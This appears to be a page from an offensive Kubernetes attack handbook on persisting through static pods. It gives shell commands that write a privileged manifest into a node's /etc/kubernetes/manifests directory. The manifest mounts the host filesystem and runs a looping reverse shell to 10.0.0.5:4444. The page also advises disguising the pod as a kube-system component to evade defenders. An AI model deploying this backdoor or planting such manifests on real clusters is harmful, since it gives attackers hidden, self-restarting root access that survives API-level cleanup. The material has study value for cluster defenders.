---
title: "Static pods: pods the kubelet runs from a node manifest directory"
order: 5
description: "The kubelet runs any pod manifest placed in its static-pod directory (commonly /etc/kubernetes/manifests), directly and without the API server. An attacker with node file access drops a manifest there for a privileged backdoor pod that the kubelet starts and keeps alive, with no corresponding API object for a defender to see or delete through kubectl."
keywords:
  - static pod
  - kubelet manifests
  - node persistence
  - mirror pod
  - backdoor
---

# Static pods

The kubelet watches a local directory, usually `/etc/kubernetes/manifests`, and runs any pod manifest it finds there directly, independent of the API server and the scheduler. These static pods are how control-plane components themselves run. An attacker who can write to that directory on a node (after a node compromise) drops a manifest for a privileged backdoor pod; the kubelet starts it and restarts it if it dies. The API server shows only a read-only mirror pod, and deleting that mirror through the API does not remove the static pod, which the kubelet immediately recreates from the on-disk manifest.

Requires write access to the node's manifest directory:

```bash
ls -l /etc/kubernetes/manifests/              # the static pod directory
# the path is the kubelet's --pod-manifest-path / staticPodPath; confirm from its config
grep -i staticPodPath /var/lib/kubelet/config.yaml 2>/dev/null
```

## Drop a backdoor manifest

```bash
cat > /etc/kubernetes/manifests/kube-proxy-metrics.yaml <<'YAML'
apiVersion: v1
kind: Pod
metadata: { name: kube-proxy-metrics, namespace: kube-system }
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","while :; do sh -i >& /dev/tcp/10.0.0.5/4444 0>&1; sleep 60; done"]
    securityContext: { privileged: true }
    volumeMounts: [{ name: h, mountPath: /host }]
  volumes: [{ name: h, hostPath: { path: / } }]
YAML
# the kubelet starts it within seconds; no API create was needed
```

## Exploitation notes

- The static pod has no real API object: `kubectl delete` removes only the mirror, and the kubelet recreates the pod from the manifest, so persistence survives API-level cleanup until the file is removed from the node.
- It requires node file access, so it chains after a node compromise ([Pod escape to node](../pod-escape-to-node/index.md)); it is a way to keep that node foothold durably.
- Name the manifest and pod to resemble a control-plane component in `kube-system`, where static pods are expected, to avoid standing out among the legitimate ones.
- Privileged plus hostPath makes the backdoor also a full node foothold on every restart.

## References

- [Kubernetes: static pods](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)
- [Microsoft: Kubernetes threat matrix (persistence)](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
